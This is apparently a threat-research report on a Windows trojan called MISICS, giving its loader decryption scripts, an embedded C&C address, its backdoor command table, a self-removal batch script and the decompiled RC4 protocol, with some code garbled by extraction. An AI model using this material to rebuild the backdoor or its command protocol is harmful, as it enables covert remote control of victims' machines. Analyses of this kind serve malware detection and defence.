@@ -1,0 +1,552 @@
+Operating routine
+The loader is a dynamic library with Rundll32Entry and ServiceEntry exported
+functions. During the infection process, it is installed in directory C:
+\ProgramData\MISICS\MISICS.dll .
+It can be launched as a service using svchost.exe or execute its own code using rundll32.exe.
+During initialization, it checks which way the process was launched. The trojan restarts using
+rundll32.exe with the -auto key, in case it was launched differently.
+For obfuscation purposes, a large amount of garbage code is used, making it difficult to
+detect the original instructions. The search for all utilized APIs is performed via the PEB
+(Process Environment Block) in the kernel32.dll and user32.dll libraries by name, which results
+in the API address being entered in the function table.
+Next, the program loads the <loader name>.crt file into memory, which is an encrypted
+payload. The first 4 bytes of the file are used to generate the decryption key, and the rest is
+decrypted. The key is a checksum of the first 4 bytes calculated using the CRC32 algorithm.
+The initial CRC value is set in the code 0xAC1FD22B . To decrypt each byte of data, the CRC
+result from the DWORD is calculated, which contains the sequential number of the
+decrypted byte. The CRC value from the previous step is the initial CRC value for the next
+calculation.
+Decryption algorithm
+```
+ import struct
+def crc32table():
+```
+```
+ s = dict()
+for i in range(0x100):
+x = i
+for j in range(8):
+if x & 1:
+x = ((x >> 1) ^ 0xEDB88320) & 0xffffffff
+else:
+x = (x >> 1) & 0xffffffff
+s[i] = x
+return s
+table = crc32table()
+def crc32(crc, data):
+for i in range(len(data)):
+crc = ((crc >> 8) ^ table[(crc ^ ord(data[i])) & 0xff]) & 0xffffffff
+return crc
+def decrypt(data):
+s = ''
+key = crc32(0xAC1FD22B, data[:4])
+j = 0
+for i in range(4, len(data)):
+key = crc32(key, struct.pack('<I', j))
+s += chr((ord(data[i]) - key) & 0xff)
+j += 1
+return s
+if name == 'main':
+with open('MISICS.dll.crt', 'rb') as f:
+data = f.read()
+with open('payload', 'wb') as f:
+f.write(decrypt(data))
+```
+After decryption, the trojan checks the value of the first DWORD of the decrypted data. If it
+is not equal to 0x13AB7064, the decryption is considered incomplete.
+The 0x318 byte configuration is located at the beginning of the decrypted data, and the
+payload is located right after it.
+```
+ #pragma pack(push,1)
+struct cfg
+{
+ _DWORD sig; // 0x13AB7064
+```
+```
+ _DWORD isPE;
+ _BYTE payload_entry_func_name[260];
+ _BYTE payload_entry_func_arg[260];
+ _BYTE payload_exit_func_name[260];
+ _DWORD bCreateDllExitEvent;
+ };
+#pragma pack(pop)
+```
+The field of the isPE structure can take the following values:
+0 — the payload is a shellcode,
+1 — the payload is MZPE file (.exe),
+2 — the payload is MZPE file (.dll).
+If bCreateDllExitEvent is equal to 1, the trojan creates an event signaling the successful
+completion at the end of operation. The trojan also calls the payload_exit_func_name
+function of the payload. In the studied sample, the payload is a shellcode.
+Debugging strings generated on the stack:
+
+
+Get Payload File Name.\n
+
+
+ServerLoadPayload()\n
+
+
+Get Module File Name.\n
+
+
+Read Payload File.\n
+
+
+Switch to payload directory.\n
+
+
+Verify Payload Data.\n
+
+
+Decrypt Payload Data.\n
+
+
+Load PE.\n
+
+
+Create DllExit Event.\n
+
+
+Get DllExit Export Function.\n
+
+
+Example of creating a rundll32.exe:
+Obfuscation is a frequent inclusion of the one-type code that does not affect the
+performance of the main functions. There is also a lot of meaningless calls added:
+```
+GetVersion(), SetLastError(), GetLastError(), GetSystemTime(),
+SystemTimeToFileTime(), OutputDebugString(), and GetTickCount().
+```
+Some OutputDebugString calls provide useful debugging information.
+Another distinctive feature is the large number of allocations of small memory blocks using
+the new function with simultaneously release.
+Payload
+The main body of the shellcode and its configuration are encrypted using a simple
+algorithm based on the XOR operation. Decryption is performed by the part of the shellcode
+that was previously decrypted by the loader. Decryption algorithm:
+```
+ import idaapi
+k = 0x0c
+for i in range(0xbce57):
+k = (k + i) & 0xff
+idaapi.patch_byte(0x25 + i, idaapi.get_byte(0x25 + i) ^ k)
+```
+After decryption the shellcode receives control. Similar to the loader, the shellcode searches
+for all the necessary APIs via the PEB and enters their addresses in the function table. The
+following algorithm is used to hash the name of the exported function:
+```
+ ror = lambda val, r_bits, max_bits: \
+ ((val & (2max_bits-1)) >> r_bits%max_bits) | \
+ (val << (max_bits-(r_bits%max_bits)) & (2max_bits-1))
+a = 'GetProcAddress\x00'
+c = ord(a[0])
+for i in range(1,len(a)):
+c = (ord(a[i]) + ror(c, 13, 32)) & 0xffffffff
+```
+During the process of searching for the necessary functions, the trojan unpacks the
+ssleay32.dll and libeay32.dll filles from its body, which are located at the 0xF2 offset in
+shellcode and are compressed using the zlib library, then manually loads them. After that,
+the trojan parses the configuration embedded in its body:
+```
+Bing@Google@Yahoo|tv.teldcomtv.com:53;tv.teldcomtv.com:53;|
+1;1;1;1;1;1;1;|00-24;|5;
+```
+where |1;1;1;1;1;1;1;|00-24;| defines the schedule of communication sessions with
+C&C server.
+The configuration can contain up to 6 addresses of the C&C servers. Each address consists of
+an address and port separated by a colon.
+Then the current date and time are compared with the parameters from the configuration. If
+the date and time match the configuration parameters, the trojan attempts to connect to
+one of the C&C servers specified in the configuration over the SSL Protocol. After successful
+connection, the program collects information about the infected computer:
+```
+ #pragma pack(push, 1)
+struct botinfo
+{
+wchar_t compname[100];
+ _BYTE osver;
+ _BYTE gotcompname;
+ _BYTE isx64arch;
+ _BYTE macaddress[6];
+ _DWORD ipaddress;
+ _BYTE byte10;
+ _BYTE iswow64proc;
+ _WORD year;
+ _WORD month;
+ _WORD day;
+ };
+#pragma pack(pop)
+```
+Then it sends information about the infected computer to the server (cmdid == 0x129E,
+datasize == 0xdd) and checks that the response sent matches cmid == 0x132A . It
+sends a packet containing cmdid == 0x155B and 3 parameters for each of the 30 possible
+modules. After that, the malicious program waits for commands from the server. The waiting
+time is calculated using the formula:
+```
+ v12 = 60000 * ctx->period;
+ min = 120000 * ctx->period / 3u;
+ticks = ctx->imp->GetTickCount();
+ctx->imp->Sleep(ticks % (v12 - min) + min);
+```
+where ctx->period is the last number from the configuration. After a pause, the
+communication process with the server starts again.
+The server can send the following commands:
+|Command ID|Description|Arguments|Answer|Answer data|
+|---|---|---|---|---|
+|0x1AC3|To maintain theconnection|no|0x1AC3||
+|0x1C1C|To remove itselffrom the system|-|-|-|
+|0x230E|To create a bufferfor the payload(shellcode orMZPE file)|payload_paramsstructure:#pragmapack(push,1)struct payload_params{_BYTE type;_DWORD index;_DWORDdword5;_DWORDbufsize;_DWORDshellcode_ep;_DWORD sig;};#pragmapack(pop)|0x2873 in case ofsuccess0x2D06 in case offailure|0 (_QWORDsize)-|
+|0x294C|To copy thepayload intoprepared buffer|Data to be copied|0x2873|Current size of thepayload(_QWORD size)|
+|0x2AC8|To launch thepayload|-|0x2743|0 (_QWORD size)|
+|0x2D06|To releasememory for thepayload|-|0x2D06|-|
+|0x590A|To launch filemanager|Awaits the followingstructure as anargument#pragmapack(push,1)struct cmdarg{_BYTE cmdid;char s[];};#pragmapack(pop)|0x3F15 (filemanager launch)0x3F15 (filemanagertermination)|Structure receivedfrom the server,with the length ofthe secondparameter limitedto 90 symbols-|
+|Command ID|Description|Arguments|Answer|Answer data|
+|---|---|---|---|---|
+|0x3099|To process othercommands|Awaits the followingstructure as anargument#pragmapack(push,1)struct cmdarg{_BYTE cmdid;char s[];};#pragmapack(pop)|0x3F15 (start ofcommandprocessing)0x3F15 (end ofcommandprocessing)|Structure receivedfrom the serverwith the length ofthe secondparameter limitedto 90 symbols-|
+0x2AC8 (Payload launch)
+It is used after the 0x230E and 0x294C commands; payload_params->index == 4
+parameter is required. The trojan starts a thread in which it performs all the actions;
+payload_params->sig == 0x7AC9 means the payload is not encrypted.
+If the payload is encrypted, a decryption key is generated:
+```
+ imp->sprintf(rc4_key, "%02x#%02X_5B", BYTE2(payload_params->sig), (unsigned __int8)
+ payload_params->sig);
+```
+The key is then expanded to 256 bytes, and the entire buffer is decrypted by the received
+key.
+
+payload_params->type == 0 means the buffer contains the shellcode, and
+
+payload_params->shellcode_ep specifies the offset in the shellcode to start
+execution from.
+payload_params->type == 1 means the buffer contains an MZPE file. The trojan
+loads it into memory and passes the code execution to the OEP (Original entry point).
+Next, the file is checked for export functions; if there are any, the trojan looks for the
+GetClassObject function and executes it.
+Any other value of the payload_params->type parameter leads the program to shut
+down.
+0x590A (File manager launch)
+The trojan establishes a new connection with the C&C server, in which it will accept
+commands from the file manager.
+After establishing a connection, the trojan sends a packet with cmdid == 0x3F15 and with
+data received from the server. The length of the cmdarg->s parameter is limited to 90
+symbols. After that, the malware starts a thread in which it waits for the server’s commands
+over the established connection.
+|Group|Command ID|Description|Arguments|Answer|Answer data|
+|---|---|---|---|---|---|
+|Maintainingthe connection|0x1AC3|To maintainthe connection|-|0x1AC3|-|
+|To read a file|0x55C3|To get file size|fsreadstructure:#pragmapack(push,1)struct fsread{_DWORDpos_high;_DWORDpos_low; wchar_t filename[400];};#pragmapack(pop)|0x5DE4 if thefile could notbe opened0x5DDA if thefile wasopened |-File size(QWORD type)|
+|To read a file|0x55C4|To read a file(used after0x55C3command)|-|0x5DDC if theoffset in thefile is greateror equal tothe file size0x5DDBsending filedata|-File data inblocks of0x1800bytes|
+|To read a file|Any codeexcept of0x5013after0x55C4|Error|-|0x5DE4error|-|
+|To read a file|0x5013|To close a file|-|-|-|
+|To write a file|0x55C7|To open a filefor readingand writing|Filename(wchar_t[400])|0x5DE4 if thefile could notbe opened|-|
+|Col1|Col2|Col3|Col4|0x5DE1 if thefile wasopened|File size(QWORD type)|
+|---|---|---|---|---|---|
+||0x55C8|To write datato a file|Data to bewritten|0x5DE2 filewritingcompleted|-|
+||Any codeexcept0x5013or0x55C9 after0x55C8|Error|-|0x5DE4error|-|
+||0x55C9|End of writing|-|0x5DE3confirming theend of writing|-|
+||0x5013|To close a file|-|-|-|
+|To list adirectory|0x55C5|To list adirectory|(wchar_t[400]) path|0x5DDDbeginning ofdirectorylisting|-|
+|To list adirectory|-|Is ignored,listing stopsonly when allfiles and sub-directories arelisted or anerror occurs|-|0x5DDE Tolist a directory,excludingfoldersIf the packetsize with thenext fileexceeds themaximumpacket size(0x2000bytes), thenthe trojansends thecurrent packetand startspreparing anew one.After browsingall the files,the trojanrecursivelyproceedsthrough all the|The listing:#pragmapack(push,1)struct fsfileinfo{ wchar_t filename[];_QWORDfilesize}; struct fslsfiles{fsfileinfofiles[];};#pragmapack(pop)|
+|Col1|Col2|Col3|Col4|directories,forming alisting foreach.|Col6|
+|---|---|---|---|---|---|
+||-|-|-|0x5DDFdirectorylistingsuccessfullycompleted0x5DE0 directory listingfailed with anerror|--|
+0x3099 (other commands)
+The malware checks whether the fir pipe was created for the command ID specified by the
+server. If not, it starts the thread in which it then launches the payload (similar to the 0x2AC8
+command).
+The trojan establishes a new connection with the C&C server, in which it will accept
+commands related to 0x2AC8 . After establishing a connection, the trojan sends a packet
+with cmdid == 0x3F15 and with data that was received from the server. The length of the
+cmdarg->s parameter is limited to 90 symbols. After that, the malware starts a thread, in
+which it waits for server’s commands over the established connection.
+If the fir pipe is created, the trojan sends the 0x32E0 packet without parameters, then
+sends the 0x3F15 packet without it as well. After that, it finishes processing the command.
+Creates 3 pipes:
+
+
+\\.\pipe\windows@#%02XMon
+
+
+\\.\pipe\windows@#%02Xfir
+
+
+\\.\pipe\windows@#%02Xsec
+
+
+where %02X is replaced with a number passed by the server.
+In a separate thread it reads data from the fir pipe and sends it to the server with the
+0x34A7 command ID.
+Next, the trojan starts another thread that directly processes the server’s commands:
+
+
+0x1AC3 — maintains the connection;
+
+
+0x3167 — writes the data received from the server to the sec pipe;
+
+
+0x32E0 — writes the 0x32E0 command to the Mon pipe;
+
+
+0x38AF — writes the 0x38AF command to the Mon pipe and then closes the connection
+with the server;
+
+
+0x3716 — writes 12 bytes received from the server, as well as a pointer to the buffer with
+the payload, payload’s size and offset to the shellcode entry point to the sec pipe;
+
+
+0x3A0B — similar to 0x3099 ;
+
+
+0x3CD0 — starts the proxy.
+
+
+0x3CD0 (Proxy)
+When receiving the 0x3099 command in the framework for processing the 0x590A
+command, the trojan tries to open port 127[.]0.0[.]1:5000 . If it fails, it increases the
+port number by one and tries again until the port is opened. Then it writes 3 bytes to the
+second pipe: 1 byte of the argument and 2 bytes for the open port.
+It starts a thread in which it waits for incoming connections. Once the connection is
+established, it transfers data from the socket to the C&C server and back. When sending data
+to the C&C server, cmdid is set to 0x9F37 .
+0x1C1C (Self-removing)
+The program attempts to terminate its process via taskkill /f /pid <pid> . It copies
+cmd.exe to the %ALLUSERSPROFILE%\\com.microsoft\\dllhost.exe directory (for
+Windows XP — %ALLUSERSPROFILE%\\Application Data\\com.microsoft\
+\dllhost.exe ). For later Windows versions, it also copies %WINDIR%\\System32\
+\<deflocale>\ \ cmd.exe.mui to %ALLUSERSPROFILE%\\com.microsoft\
+\dllhost.exe.mui, where <deflocale> is the name of the default locale.
+In the %ALLUSERSPROFILE%\\com.microsoft\\ directory (for Windows XP a %
+ALLUSERSPROFILE%\\Application Data\\com.microsoft\\), it creates a
+mshelp.bat file that contains the following set of commands:
+```
+ sc stop misics
+sc delete misics
+rd /s /q "%ALLUSERSPROFILE%\Misics"
+ rd /s /q "%ALLUSERSPROFILE%\Media"
+ taskkill /f /pid 
+ rd /s /q "%HOMEDRIVE%\DOCUME~1\ALLUSE~1\APPLIC~1\Misics"
+ rd /s /q "%HOMEDRIVE%\DOCUME~1\ALLUSE~1\APPLIC~1\Media"
+ reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Misics" /f
+del %0
+```
+where <curpid> is the trojan’s PID.
+Then it launches the batch file and shuts down.
+Protocol for communicating with the C&C server
+Data is encrypted before being sent to the sever. First, an RC4 key is generated to encrypt
+the packet header:
+1) A packet header consisting of 8 DWORDs is generated:
+```
+ imp->memset(header, 0i64, 32i64);
+...
+header[4] = 0xE0B2; //signature
+header[5] = cmdid;
+header[3] = datasize;
+header[0] = datasize + imp->GetTickCount() % 0x87C9;
+header[1] = datasize + imp->GetTickCount() % 0x3F0D;
+header[2] = datasize + imp->GetTickCount() % 0x9B34;
+header[7] = datasize + imp->GetTickCount() % 0xF317;
+```
+2) Based on the header[7] value, key_part_2 is generated, consisting of 4 bytes:
+```
+ key_part_2[3] = LOBYTE(header[7]) & 0x7A;
+ key_part_2[2] = BYTE2(header[7]) ^ 0x81;
+ key_part_2[1] = BYTE1(header[7]) ^ 0x4E;
+ key_part_2[0] = HIBYTE(header[7]) & 0x3D;
+```
+3) Based on the header[7] value, key_part_3 is generated, consisting of 4 bytes:
+```
+ key_part_3[2] = BYTE2(header[7]) & 0xA6;
+ key_part_3[3] = LOBYTE(header[7]) ^ 0x6F;
+ key_part_3[1] = BYTE1(header[7]) ^ 0x86;
+ key_part_3[0] = HIBYTE(header[7]) & 0xE4;
+```
+4) Based on the received header[7], key_part_2, key_part_3, the trojan generates
+a string that is a short key for encrypting the header:
+```
+ z = 0;
+for ( i = 0i64; i < 4; ++i )
+{
+imp_->sprintf(&rc4_key[z], "%02X", ((unsigned __int8 )&header[7] + i));
+ z += 2;
+imp_->sprintf(&rc4_key[z], "%02x", key_part_2[i]);
+ z += 2;
+imp_->sprintf(&rc4_key[z], "%02X", key_part_3[i]);
+ z += 2;
+}
+```
+5) The obtained short key is expanded to a 256-byte key, which is used for encryption by the
+RC4 algorithm:
+```
+ p_rc4_key = &rc4_key[1];
+do
+{
+p_rc4_key += 2;
+ v28 = x % short_key_len;
+ v29 = x + 1;
+x += 2;
+*(p_rc4_key - 3) = short_key[v28];
+```
+```
+ *(p_rc4_key - 2) = short_key[v29 % short_key_len];
+ }
+while ( x < 256 );
+```
+6) The received RC4 key is used to encrypt the header (32 bytes).
+Next, an RC4 key is generated to encrypt the packet data:
+1) key_part_4 is formed (4 bytes):
+```
+ imp->memcpy(key_part_4, (char *)&header[3], 4i64);
+ key_part_4[2] = key_part_4[1] & 0x89;
+ key_part_4[1] = key_part_4[1] & 0x89 ^ 0x60;
+ key_part_4[3] = key_part_4[0] ^ 0xAC;
+ key_part_4[0] = (key_part_4[0] ^ 0xAC) & 0xCD;
+```
+2) key_part_5 is formed (4 bytes):
+```
+ imp->memcpy(key_part_5, (char *)&header[5], 4i64);
+ key_part_5[3] = key_part_5[0] & 0xB0;
+ key_part_5[0] = key_part_5[0] & 0xB0 ^ 0xD1;
+ key_part_5[2] = key_part_5[1] ^ 0x8D;
+ key_part_5[1] = (key_part_5[1] ^ 0x8D) & 0x64;
+```
+3) key_part_6 is formed (4 bytes):
+```
+ imp->memcpy(key_part_6, (char *)&header[4], 4i64);
+ key_part_6[3] = key_part_6[0] & 0xB4;
+ key_part_6[0] &= 0x94u;
+ key_part_6[2] = key_part_6[1] ^ 0x91;
+ key_part_6[1] ^= 0xF9u;
+```
+4) key_part_7 is formed (4 bytes):
+```
+ imp->memcpy(key_part_7, (char *)&header[2], 4i64);
+ key_part_7[3] = key_part_7[0] & 0x8A;
+ key_part_7[0] &= 0x82u;
+ key_part_7[2] = key_part_7[1] ^ 0xB2;
+ key_part_7[1] ^= 0xD8u;
+```
+5) A short key is generated, which will be further used for data encryption:
+```
+ c = 0
+for ( k = 0i64; k < 4; ++k )
+{
+imp->sprintf(&rc4_key_final[c], "%02X", key_part_4[k]);
+ c += 2;
+imp->sprintf(&rc4_key_final[c], "%02x", key_part_5[k]);
+ c += 2;
+imp->sprintf(&rc4_key_final[c], "%02X", key_part_6[k]);
+ c += 2;
+imp->sprintf(&rc4_key_final[c], "%02x", key_part_7[k]);
+ c += 2;
+}
+```
+6) The obtained short key is expanded to a 256-byte key, which is used for encryption by the
+RC4 algorithm.
+The trojan sends a POST request:
+```
+ imp->sprintf(
+request,
+ "POST http://%s/updates.php?0x%08x HTTP/1.1\r\n"
+"Host: %s\r\n"
+"Connection: Keep-Alive\r\n"
+ "User-Agent: Mozilla/5.0\r\n"
+"Cache-Control: no-catch\r\n"
+"Content-Length: %d\r\n"
+ "\r\n",
+host,
+ctx->tick,
+host,
+datasize + 32i64);
+```
+The ctx->tick parameter changes after each request and is equal to GetTickCount()
+% 0xFFFFFFFE .
+Data encoded by the RC4 algorithm with key_part_1 (32 bytes) written at the beginning is
+used as request data.
+When receiving a packet, the response headers are skipped, and only the \r\n\r\n string
+is checked. The trojan reads the header (the first 32 bytes), and then proceeds with response
+decrypting.
+1) Based on the header[7] value, key_part_2 is generated, consisting of 4 bytes:
+```
+ key_part_2[3] = LOBYTE(header[7]) & 0x7A;
+ key_part_2[2] = BYTE2(header[7]) ^ 0x81;
+ key_part_2[1] = BYTE1(header[7]) ^ 0x4E;
+ key_part_2[0] = HIBYTE(header[7]) & 0x3D;
+```
+2) Based on the key_part_1[7] value, key_part_3 is generated, consisting of 4 bytes:
+```
+ key_part_3[2] = BYTE2(header[7]) & 0xA6;
+ key_part_3[3] = LOBYTE(header[7]) ^ 0x6F;
+ key_part_3[1] = BYTE1(header[7]) ^ 0x86;
+ key_part_3[0] = HIBYTE(header[7]) & 0xE4;
+```
+3) Based on the received header[7], key_part_2, key_part_3, the trojan generates
+a string that is a short key for header decrypting:
+```
+ z = 0;
+for ( i = 0i64; i < 4; ++i )
+{
+imp_->sprintf(&rc4_key[z], "%02X", ((unsigned __int8 )&key_part_1[7] + i));
+ z += 2;
+imp_->sprintf(&rc4_key[z], "%02x", key_part_2[i]);
+ z += 2;
+imp_->sprintf(&rc4_key[z], "%02X", key_part_3[i]);
+ z += 2;
+}
+```
+4) key_part_4 is formed (4 bytes):
+```
+ imp->memcpy(key_part_4, (char *)&header[3], 4i64);
+ key_part_4[2] = key_part_4[1] & 0x89;
+ key_part_4[1] = key_part_4[1] & 0x89 ^ 0x60;
+ key_part_4[3] = key_part_4[0] ^ 0xAC;
+ key_part_4[0] = (key_part_4[0] ^ 0xAC) & 0xCD;
+```
+5) key_part_5 is formed (4 bytes):
+```
+ imp->memcpy(key_part_5, (char *)&header[5], 4i64);
+ key_part_5[3] = key_part_5[0] & 0xB0;
+ key_part_5[0] = key_part_5[0] & 0xB0 ^ 0xD1;
+ key_part_5[2] = key_part_5[1] ^ 0x8D;
+ key_part_5[1] = (key_part_5[1] ^ 0x8D) & 0x64;
+```
+6) key_part_6 is formed (4 bytes):
+```
+ imp->memcpy(key_part_6, (char *)&header[4], 4i64);
+ key_part_6[3] = key_part_6[0] & 0xB4;
+ key_part_6[0] &= 0x94u;
+ key_part_6[2] = key_part_6[1] ^ 0x91;
+ key_part_6[1] ^= 0xF9u;
+```
+7) key_part_7 is formed (4 bytes):
+```
+ imp->memcpy(key_part_7, (char *)&header[2], 4i64);
+ key_part_7[3] = key_part_7[0] & 0x8A;
+ key_part_7[0] &= 0x82u;
+ key_part_7[2] = key_part_7[1] ^ 0xB2;
+ key_part_7[1] ^= 0xD8u;
+```
+8) Based on the received key_part_4, key_part_5, key_part_6, key_part_7,
+the trojan generates a string that is a short key for decrypting the payload:
+```
+ z = 0;
+for ( j = 0i64; j < 4; ++j )
+{
+imp_->sprintf(&payload_rc4_key[z], "%02X", key_part_4[j]);
+ z += 2;
+imp_->sprintf(&payload_rc4_key[z], "%02x", key_part_5[j]);
+ z += 2;
+imp_->sprintf(&payload_rc4_key[z], "%02X", key_part_6[j]);
+ z += 2;
+imp_->sprintf(&payload_rc4_key[z], "%02x", key_part_7[j]);
+ z += 2;
+}
+```
+9) Decrypts header with the key generated in step 3 and expanded to 256 bytes;
+10) Checks that header[4] is equal to 0xE0B2 ;
+11) header[5] contains the command ID and header[3] contains the payload size;
+12) Receives the payload and decrypts it with the RC4 key obtained in step 8 and expanded
+to 256 bytes.
